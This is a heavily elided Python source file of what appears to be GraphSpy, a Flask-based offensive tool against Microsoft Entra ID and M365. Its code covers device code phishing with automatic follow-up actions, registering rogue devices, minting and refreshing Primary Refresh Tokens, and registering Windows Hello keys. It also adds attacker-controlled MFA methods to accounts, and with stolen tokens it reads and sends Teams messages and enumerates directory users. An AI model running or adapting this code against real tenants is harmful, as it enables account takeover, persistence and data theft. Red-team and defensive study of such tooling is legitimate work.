...
def list_databases():
    ...
    databases = [
        {
            "name": db_file.name,
            "last_modified": f"{datetime.fromtimestamp(db_file.stat().st_mtime)}".split(
                "."
            )[0],
            "size": f"{round(db_file.stat().st_size/1024)} KB",
            "state": (
                "Active"
                if db_file.name.lower()
                == os.path.basename(app.config["graph_spy_db_path"]).lower()
                else "Inactive"
            ),
        }
        for db_file in db_folder_content
        if db_file.is_file() and db_file.name.endswith(".db")
    ]
    return databases
...
def update_db():
    ...
    current_schema_version = query_db(
...
def parse_token_endpoint_error(error_response):
    try:
        ...
        error_description = error_response.json().get(
...
def generic_request(
    ...
    while retry_count > 0:
        ...
        # Json request
            ...
            try:
                ...
                return (
                    f"[Error] The body message does not contain valid JSON, but a body type of JSON was specified.",
                    400,
                )
        else:
    ...
    response_type = (
        ...
        if (
            ...
            if (
                "Content-Type" in response.headers
                and "xml" in response.headers["Content-Type"]
            )
            else "text"
        )
    )
    ...
    row_id = execute_db(
        ...
        (
            ...
            (
                ...
                if "iat" in decoded_accesstoken
                else "unknown"
            ),
            (
                datetime.fromtimestamp(decoded_accesstoken["exp"])
                if "exp" in decoded_accesstoken
                else "unknown"
            ),
            description,
            user,
        ...
        while True:
            ...
            for row in sorted_rows:
                ...
                if response.status_code == 200 and "access_token" in response.json():
                    ...
                    # If the idtype is app, use the app_displayname or appid
                    if (
                        "idtyp" in decoded_accesstoken
                        and decoded_accesstoken["idtyp"] == "user"
                    ):
                        user = (
                            decoded_accesstoken["unique_name"]
                            if "unique_name" in decoded_accesstoken
                        ...
                        "idtyp" in decoded_accesstoken
                        and decoded_accesstoken["idtyp"] == "app"
                    ):
                        user = (
                            decoded_accesstoken["app_displayname"]
                            if "app_displayname" in decoded_accesstoken
                    ...
                    if row.get("auto_action") in ["device_prt", "winhello"]:
                        ...
                        try:
                            gspy_log.debug(
                                f"Device code phishing successful for code '{user_code}', performing auto action '{row.get('auto_action')}'"
                            )
                            ...
                            prt_id = request_prt_for_device(
                                device_id, refresh_token_id, row.get("auto_os_version")
                            )
                            if row.get("auto_action") == "winhello":
                                device_reg_access_token_id = (
                                    refresh_prt_to_access_token(
                                        prt_id,
                            ...
                            gspy_log.error(
                                f"Device code phishing successful for code '{user_code}', but the auto action '{row.get('auto_action')}' failed.\n{e}"
                            )
                            execute_db(
                                "UPDATE devicecodes SET status = ? WHERE device_code = ?",
...
def generate_public_key_rsa_blob(public_key):
    ...
    pubkeycngblob = base64.b64encode(
        b"".join(header) + exponent_as_bytes + modulus_as_bytes
    )
...
def register_device(
    access_token_id,
    device_name="GraphSpy-Device",
    join_type=0,
    device_type="Windows",
    os_version="10.0.26100",
    target_domain="e-corp.local",
):
    """
    All credit to:
...
def decrypt_session_key(session_key_jwe, private_key):
    ...
    jwe_payload_base64_padded = jwe_payload_base64 + (
        "=" * (len(jwe_payload_base64) % 4)
    )
...
def request_prt_for_device(device_id, refresh_token_id, os_version="10.0.26100"):
    ...
    jwt_header = {"x5c": certificate_base64, "kdf_ver": 2}
    request_jwt = jwt.encode(
        jwt_payload, key=private_key, algorithm="RS256", headers=jwt_header
    )
    # Request PRT
    prt_request_data = {
    ...
    if not "refresh_token" in response_json or not "session_key_jwe" in response_json:
        raise AppError(
            f"Failed to request PRT. No 'refresh_token' or 'session_key_jwe' in response."
        )
...
def refresh_prt_to_access_token(
    ...
    jwt_payload = {
        "win_ver": "10.0.26100",
        "scope": (
            "openid aza" if refresh_prt else "openid"
        ),  # If scope includes "aza", it will issue a new PRT. Else it will issue a regular refresh token
        "request_nonce": nonce,
        "refresh_token": prt,
        "redirect_uri": (
            f"ms-appx-web://Microsoft.AAD.BrokerPlugin/{client_id}"
            if not redirect_uri
            else redirect_uri
        ),
    ...
    gspy_log.debug(
        f"Decrypted PRT to access token response: \n{decrypted_response_json}"
    )
    if not "access_token" in decrypted_response_json:
        raise AppError(
            f"Failed to request access token with PRT. No 'access_token' in decrypted token response."
        )
    access_token_row_id = save_access_token(
        decrypted_response_json["access_token"], f"Created using PRT {prt_id}"
    )
    issued_at = int(datetime.now().timestamp())
...
def register_winhello(access_token_id):
    ...
    device_id = decoded_accesstoken.get(
    ...
    if response.status_code != 200:
        raise AppError(
            f"Failed to register WinHello for device. Received status code {response.status_code}"
        )
    response_json = response.json()
    key_id = response_json.get("kid", "00000000-0000-0000-0000-000000000000")
    user = response_json.get("upn", "Unknown")
    winhello_id = execute_db(
...
def winhello_to_prt(winhello_id, device_id=None, winhello_username=None):
    ...
    winhello_private_key = serialization.load_pem_private_key(
        winhello_private_key_bytes, password=None
    )
    ...
    winhello_assertion_headers = {"kid": kid, "use": "ngc"}
    winhello_assertion = jwt.encode(
        winhello_assertion_payload,
        winhello_private_key_bytes,
        algorithm="RS256",
        headers=winhello_assertion_headers,
    )
    ...
    device_certificate_base64 = query_db(
        "SELECT certificate FROM device_certificates WHERE device_id = ?",
        [device_id],
        one=True,
    )[0]
    device_private_key_base64 = query_db(
        "SELECT priv_key FROM device_certificates WHERE device_id = ?",
        [device_id],
        one=True,
    )[0]
    if not device_certificate_base64 or not device_private_key_base64:
        raise AppError(f"No certificate or private key for device with ID {device_id}!")
    jwt_header = {"x5c": device_certificate_base64, "kdf_ver": 2}
    device_private_key_bytes = base64.b64decode(device_private_key_base64)
    device_private_key = serialization.load_pem_private_key(
        device_private_key_bytes, password=None
    )
    jwt_token = jwt.encode(
        jwt_payload, device_private_key, algorithm="RS256", headers=jwt_header
    )
    prt_request_body = {
        "windows_api_version": "2.2",
        "grant_type": "urn:ietf:params:oauth:grant-type:jwt-bearer",
...
def get_available_authentication_info(access_token_id):
    ...
    try:
        ...
        availableAuthenticationInfo_parsed = [
            {**availableAuthenticationInfo[method], "MethodName": method}
            for method in availableAuthenticationInfo.keys()
        ]
...
def initialize_mobile_app_registration(access_token_id, security_info_type):
    ...
    try:
        ...
        body = {"securityInfoType": security_info_type}
        response = requests.post(uri, headers=headers, json=body)
        if response.status_code != 200:
            gspy_log.error(
...
def delete_security_info(access_token_id, security_info_type, data):
    ...
    try:
        ...
        body = {"Type": security_info_type, "Data": body_data}
        ...
        if (not security_info_response) or (
            (not ("Deleted" in security_info_response))
            or (not (security_info_response["Deleted"]))
        ):
            gspy_log.error(
...
def add_security_info(access_token_id, security_info_type, data=None):
    ...
    try:
        ...
        ) and security_info_response["ErrorCode"] == 28:
...
def add_phone_number(
    ...
    data = {"phoneNumber": phone_number, "countryCode": country_code}

    if not phone_type in [
        "mobilePhone_call",
        "mobilePhone_sms",
        "altMobilePhone",
        "officePhone",
    ...
    if "captcha" in security_info_response:
        return security_info_response
    if (not ("VerificationContext" in security_info_response)) or (
        not (security_info_response["VerificationContext"])
    ):
        gspy_log.error(
...
def add_graphspy_otp(access_token_id, description=""):
    try:
        initialize_mobile_app_registration_response = (
            initialize_mobile_app_registration(access_token_id, 3)
        )
        if not initialize_mobile_app_registration_response:
            gspy_log.error(f"Failed to initialize mobile app registration.")
            return False
        account_name = (
            initialize_mobile_app_registration_response["AccountName"]
            if "AccountName" in initialize_mobile_app_registration_response
            else "Unknown"
        )
        ...
        verify_security_info_response = verify_security_info(
            access_token_id, 3, security_info_response["VerificationContext"], otp_code
        )
        if (
            "ErrorCode" in verify_security_info_response
            and verify_security_info_response["ErrorCode"]
        ):
            gspy_log.error(
                f"An error occurred when trying to validate the provided info. Received Error Code {verify_security_info_response.ErrorCode}"
            )
            return False
        execute_db(
...
def add_security_key(
    ...
    if not security_info_response or (
        "ErrorCode" in security_info_response
        and security_info_response["ErrorCode"] != 0
    ):
        error_message = (
            get_security_info_error(security_info_response["ErrorCode"])
    ...
    client_data_json_base64 = base64.urlsafe_b64encode(
    ...
    extension_results_json_base64 = base64.urlsafe_b64encode(
        str(credential.extension_results).encode("utf-8")
    ).decode()
    verification_data = {
    ...
    return create_response(
        200,
        f"Successfully added new security key with description '{key_description}' to the account.",
    )
...
def getTeamsSettings(access_token_id):
    ...
    teams_settings_db = query_db_json(
    ...
    if (
        teams_settings_db
        and int(datetime.now().timestamp()) < teams_settings_db["expires_at"]
    ):
    ...
    try:
        ...
        decoded_skype_token = jwt.decode(
...
def init_routes():
    ...
    def api_generate_device_code():
        ...
        client_id = (
            request.form.get("client_id") or "d3590ed6-52b3-4102-aeff-aad2292ab01c"
        )
        ...
        if auto_action and auto_action != "none":
            ...
            auto_join_type = (
                int(request.form.get("auto_join_type"))
                if request.form.get("auto_join_type")
                else 0
            )
            ...
            auto_target_domain = (
                request.form.get("auto_target_domain") or "e-corp.local"
            )
            user_code = device_code_flow(
                version,
                client_id,
                resource,
                scope,
            ...
            user_code = device_code_flow(
                version, client_id, resource, scope, ngcmfa, cae
            )
        return user_code
    ...
    def api_register_device():
        ...
        join_type = (
            int(request.form.get("join_type")) if request.form.get("join_type") else 0
        )
        ...
        return create_response(
            200,
            f"Successfully registered new device with Device ID {device_id}.",
            {"device_id": device_id},
        )
    ...
    def api_import_device_certificate():
        ...
        if not device_id:
            try:
                ...
                certificate = x509.load_der_x509_certificate(
                    base64.b64decode(certificate_base64)
                )
                device_id = certificate.subject.get_attributes_for_oid(
                    NameOID.COMMON_NAME
                )[0].value
            except:
        ...
        device_certificate_id = execute_db(
            "INSERT INTO device_certificates (stored_at, device_id, device_name, device_type, join_type, priv_key, certificate) VALUES (?, ?, ?, ?, ?, ?, ?)",
            (
                int(time.time()),
                device_id,
        ...
        if device_certificate_id:
            return create_response(
                200,
                f"Successfully added device certificate with ID {device_certificate_id} to the database.",
                {"device_certificate_id": device_certificate_id},
            )
        else:
            return create_response(
                400, "[Error] Failed to add device certificate to database."
            )
    ...
    def api_request_prt_for_device():
        ...
        if not prt_id:
            return create_response(
                400, f"Failed to request PRT for device with ID {device_id}."
            )
        return create_response(
            200, f"Successfully requested PRT with ID {prt_id}.", {"prt_id": prt_id}
        )
    ...
    def api_import_prt():
        ...
        description = (
            ...
            or f"Manually added at {str(datetime.now()).split('.')[0]}"
        )
        prt_id = execute_db(
            "INSERT INTO primary_refresh_tokens (device_id, user, prt, session_key, issued_at, expires_at, description) VALUES (?, ?, ?, ?, ?, ?, ?)",
            (device_id, user, prt, session_key, issued_at, expires_at, description),
        )
        if prt_id:
            return create_response(
                200,
                f"Successfully added PRT with ID {prt_id} to the database.",
                {"prt_id": prt_id},
            )
        else:
    ...
    def api_get_primary_refresh_token(id):
        rows = query_db_json(
            "SELECT * FROM primary_refresh_tokens WHERE id = ?", [id], one=True
        )
        if not rows:
    ...
    def api_refresh_prt_to_access_token():
        ...
        access_token_id = refresh_prt_to_access_token(
            prt_id, client_id, resource, refresh_prt, redirect_uri
        )
        return create_response(
            200,
            f"Successfully refreshed PRT to access token with ID {access_token_id}.",
            {"access_token_id": access_token_id},
        )

    @app.route("/api/active_prt/<id>")
    def api_set_active_prt(id):
        previous_id = query_db(
            "SELECT value FROM settings WHERE setting = 'active_prt_id'", one=True
        )
        if not previous_id:
            execute_db(
                "INSERT INTO settings (setting, value) VALUES ('active_prt_id',?)",
                (id,),
            )
        else:
            execute_db(
                "UPDATE settings SET value = ? WHERE setting = 'active_prt_id'", (id,)
            )
        return id
    ...
    def api_generate_prt_cookie():
        ...
        return create_response(
            200,
            f"Successfully generated PRT cookie using PRT {prt_id}.",
            {"prt_cookie": prt_cookie},
        )
    ...
    def api_register_winhello():
        ...
        return create_response(
            200,
            f"Successfully registered WinHello for device with ID {winhello_id}.",
    ...
    def api_import_winhello_key():
        ...
        if winhello_key_id:
            return create_response(
                200,
                f"Successfully added WinHello key with ID {winhello_key_id} to the database.",
                {"winhello_key_id": winhello_key_id},
            )
        else:
            return create_response(
                400, "[Error] Failed to add WinHello key to database."
            )
    ...
    def api_winhello_to_prt():
        ...
        return create_response(
            200,
            f"Successfully used WinHello key to obtain PRT with ID {prt_id}.",
            {"prt_id": prt_id},
        )
    ...
    def api_add_phone_number():
        ...
        phone_type = (
            request.form["phone_type"]
            if "phone_type" in request.form
            else "mobilePhone_sms"
        )
        if not phone_type in [
            "mobilePhone_sms",
            "mobilePhone_call",
            ...
            return (
                f"[Error] Unknown phone_type specified. Allowed options: mobilePhone_sms, mobilePhone_call, altMobilePhone, officePhone",
                400,
            )

        add_phone_number_response = add_phone_number(
    ...
    def api_add_mfa_app():
        ...
        add_mfa_app_response = add_mfa_app(
    ...
    def api_add_graphspy_otp():
        ...
        access_token_id = request.form["access_token_id"]
        description = (
            request.form["description"] if "description" in request.form else ""
        )
    ...
    def api_generate_otp_code():
        try:
            ...
            traceback.print_exc()
            return (
                "[Error] Failed to create OTP code from the provided secret key.",
                400,
            )
    ...
    def api_add_security_key():
        try:
            ...
            device_pin = (
                request.form["device_pin"] if "device_pin" in request.form else ""
            )

            add_security_key_response = add_security_key(
    ...
    def api_get_security_key_status():
        return (
            app.config["add_security_key_status"]
            if "add_security_key_status" in app.config
            else "UNKNOWN"
        )
    ...
    def api_delete_security_info():
        ...
        delete_security_info_response = delete_security_info(
            access_token_id, security_info_type, data
        )
    ...
    def api_validate_captcha():
        ...
        challenge_type = (
            request.form["challenge_type"]
            if "challenge_type" in request.form
            else "Visual"
        )

        captcha_response = validate_captcha(
            access_token_id,
            challenge_id,
            captcha_solution,
            azure_region,
        ...
        if not captcha_response["CaptchaSolved"]:
            return (
                f"[Error] Captcha not solved. Received error: {captcha_response['ErrorCode']}",
                400,
            )
        return captcha_response
    ...
    def api_initialize_mobile_app_registration():
        ...
        initialize_mobile_app_registration_response = (
            initialize_mobile_app_registration(access_token_id, security_info_type)
        )
        if not initialize_mobile_app_registration_response:
    ...
    def api_add_refresh_token():
        refreshtoken = (
            request.form["refreshtoken"] if "refreshtoken" in request.form else ""
        )
        user = request.form["user"] if "user" in request.form else ""
        tenant = (
            request.form["tenant_domain"] if "tenant_domain" in request.form else ""
        )
        ...
        client_id = (
            ...
            else "d3590ed6-52b3-4102-aeff-aad2292ab01c"
        )
    ...
    def api_refresh_to_access_token():
        refresh_token_id = (
            request.form["refresh_token_id"]
            if "refresh_token_id" in request.form
            else ""
        )
        client_id = (
            request.form["client_id"]
            if "client_id" in request.form
            else "defined_in_token"
        )
        resource = (
        ...
        scope = (
            scope
            if scope
            else "https://graph.microsoft.com/.default openid offline_access"
        )
        api_version = (
            int(request.form["api_version"]) if "api_version" in request.form else 1
        )
        ...
        result = 0
        try:
            result = refresh_to_access_token(
                refresh_token_id,
                client_id,
                resource,
                scope,
            ...
            traceback.print_exc()
            return (
                f"[Error] Unexpected error occurred. Check your input for any issues. Exception: {repr(e)}",
                400,
            )
    ...
    def api_set_active_refresh_token(id):
        previous_id = query_db(
            "SELECT value FROM settings WHERE setting = 'active_refresh_token_id'",
            one=True,
        )
        if not previous_id:
            execute_db(
    ...
    def api_add_access_token():
        accesstoken = (
            request.form["accesstoken"]
            if "accesstoken" in request.form and request.form["accesstoken"]
            else ""
        )
        description = (
            request.form["description"] if "description" in request.form else ""
    ...
    def api_custom_api_request():
        ...
        access_token_id = (
            request_json["access_token_id"] if "access_token_id" in request_json else 0
        )
        method = request_json["method"] if "method" in request_json else "GET"
        request_type = (
            request_json["request_type"] if "request_type" in request_json else "text"
        )
        ...
        if not (uri and access_token_id and method):
            ...
            return (
                f"[Error] Invalid request type '{request_type}'. Should be one of the following values: text, json, urlencoded, xml",
                400,
            )
        elif type(headers) != dict or type(variables) != dict:
            return (
                f"[Error] Expecting json input for headers and variables. Received '{type(headers)}' and '{type(variables)}' respectively.",
                400,
            )
        ...
        for variable_name, variable_value in variables.items():
            ...
            for header_name, header_value in headers.items():
                new_header_name = (
                    header_name.replace(variable_name, variable_value)
                    if type(header_name) == str
                    else header_name
                )
                new_header_value = (
                    header_value.replace(variable_name, variable_value)
    ...
    def api_save_request_template():
        ...
        request_json = request.get_json()
        template_name = (
            request_json["template_name"] if "template_name" in request_json else ""
        )
        uri = request_json["uri"] if "uri" in request_json else ""
        method = request_json["method"] if "method" in request_json else "GET"
        request_type = (
        ...
        try:
            ...
            existing_request_template = query_db_json(
            ...
            if existing_request_template:
                ...
                execute_db(
                    "DELETE FROM request_templates where id = ?",
    ...
    def api_request_templates(template_id):
        request_template = query_db_json(
        ...
        if not request_template:
            return (
                f"[Error] Unable to find request template with ID '{template_id}'.",
                400,
            )
    ...
    def api_list_request_templates():
        ...
        for i in range(len(request_templates)):
            request_templates[i]["headers"] = json.loads(
                request_templates[i]["headers"]
            )
            request_templates[i]["variables"] = json.loads(
    ...
    def api_get_teams_conversations():
        ...
        if not teams_settings:
            return (
                f"[Error] Unable to obtain teams settings with access token {access_token_id}.",
                400,
            )
        chat_service_uri = json.loads(teams_settings["teams_settings_raw"])[
            "regionGtms"
        ]["chatService"]
        ...
        return (
            f"[Error] Something went wrong trying to obtain Teams Conversations. Received response status {response['response_status_code']} and response type {response['response_type']}",
            400,
        )
    ...
    def api_get_teams_conversation_messages():
        ...
        if (
            ...
            conversation_messages["messages"] = [
                {
                    **message,
                    "isFromMe": message["from"].endswith(teams_settings["skype_id"]),
                }
    ...
    def api_send_teams_conversation_message():
        ...
        headers = {
            "Authentication": f"skypetoken={teams_settings['skypeToken']}",
            "User-Agent": get_user_agent(),
        }
        body = {"messagetype": "RichText/Html", "content": message_content}
        response = requests.post(conversation_link, headers=headers, json=body)
        if response.status_code >= 200 and response.status_code < 300:
            message_id = (
                response.json()["OriginalArrivalTime"]
                if "OriginalArrivalTime" in response.json()
                else "Unknown"
            )
            return f"{message_id}"
        return (
            f"[Error] Something went wrong trying to send Teams message. Received response status {response.status_code}",
            400,
        )
        gspy_log.error(
    ...
    def api_get_teams_conversation_members():
        ...
        teams_and_channel_service_uri = json.loads(
            teams_settings["teams_settings_raw"]
        )["regionGtms"]["teamsAndChannelsService"]
        ...
        if (
            ...
            conversation_members = [
                {
                    **member,
                    "isCurrentUser": member["mri"].endswith(teams_settings["skype_id"]),
                }
                for member in conversation_members
            ]
            gspy_log.debug(
                f"Found {len(conversation_members)} members in conversation '{conversation_id}'"
            )
        ...
        return (
            f"[Error] Something went wrong trying to obtain Teams Members. Received response status {response['response_status_code']} and response type {response['response_type']}",
            400,
        )
    ...
    def api_get_teams_image():
        ...
        return (
            f"[Error] Something went wrong trying to obtain teams image. Received response status {response.status_code} and response type {response.headers['Content-Type'] if 'Content-Type' in response.headers else 'empty'}",
            400,
        )
    ...
    def api_list_teams_users():
        ...
        while True:
            uri = (
                f"{base_uri}&skipToken={next_skiptoken}" if next_skiptoken else base_uri
            )
            response = generic_request(uri, access_token_id, "GET", "text", "")
            if not (
                response["response_status_code"] == 200
        ...
        return (
            f"[Error] Something went wrong trying to list Teams Users. Received response status {response['response_status_code']} and response type {response['response_type']}",
            400,
        )
    ...
    def api_get_teams_user_details():
        ...
        if not "user_id" in request.args:
            return (
                f"[Error] No user_id specified. Specify a valid UPN, ObjectID or MRI of the user",
                400,
            )
    ...
    def api_create_teams_conversation():  # access_token_id, members, type, topic, message_content
        ...
        if not conversation_type in ["direct_message", "group_chat"]:
            return (
                f"[Error] Type needs to be either 'direct_message' or 'group_chat'.",
                400,
            )
        teams_settings = getTeamsSettings(access_token_id)
        if not teams_settings:
        ...
        conversation_members = [
            {"id": f"8:{teams_settings['skype_id']}", "role": "Admin"}
        ]
        ...
        if conversation_type == "direct_message":
            for member in members:
                ...
                body["members"].append({"id": member, "role": "Admin"})
                response = requests.post(uri, headers=headers, json=body)
                if (
                    ...
                    conversation_id_regex = re.search(
            ...
            for member in members:
                conversation_members.append({"id": member, "role": "Admin"})
            body = {
                "members": conversation_members,
                "properties": conversation_properties,
            }
            ...
            if (
                ...
                if conversation_id_regex:
                    ...
                    created_conversations.append(conversation_id)
                    gspy_log.debug(
                        f"Created conversation with {len(members)} members. Conversation ID: {conversation_id}"
                    )
                else:
                    gspy_log.error(
    ...
    def api_get_entra_users():
        ...
        if (
            "customize_properties" in request.args
            and request.args["customize_properties"] != " "
        ):
        ...
        for x in range(5000):
            ...
            if (
                ...
                return (
                    f"[Error] Something went wrong trying to obtain Entra ID Users. Received response status {response['response_status_code']} and response type {response['response_type']}",
                    400,
                )
        return users_list
    ...
    def api_get_entra_user_details(user_id):
        ...
        batch_response = generic_request(
            batch_uri, access_token_id, "POST", "json", batch_body
        )
        if not (
            batch_response["response_status_code"] == 200
            and batch_response["response_type"] == "json"
        ):
            gspy_log.error(
            ...
            return (
                f"[Error] Something went wrong trying to obtain user details of '{user_id}'. Received response status {batch_response['response_status_code']} and response type {batch_response['response_type']}",
                400,
            )
        ...
        user_details = [
            ...
            if response["id"] == "userDetails" and response["status"] == 200
        ]
        if len(user_details) == 0:
            ...
            gspy_log.error(batch_response)
            return (
                f"[Error] Something went wrong trying to obtain user details of '{user_id}'.",
                400,
            )
        ...
        for response in batch_response_list:
            if response["id"] == "userDetails":
                continue
            user_details[response["id"]] = (
                response["body"]["value"] if "value" in response["body"] else []
            )
        return user_details
    ...
    def api_get_settings():
        ...
        settings_json = {
            setting["setting"]: setting["value"] for setting in settings_raw
        }
...
def build_parser() -> argparse.ArgumentParser:
    ...
    parser.add_argument(
        ...
        "--interface",
        type=str,
        help="The interface to bind to. Use 0.0.0.0 for all interfaces. (Default = 127.0.0.1)",
    )
    ...
    advanced_group.add_argument(
        "--debug",
        action="store_true",
        help="Enable flask debug mode. Will show detailed stack traces when an error occurs.",
    )
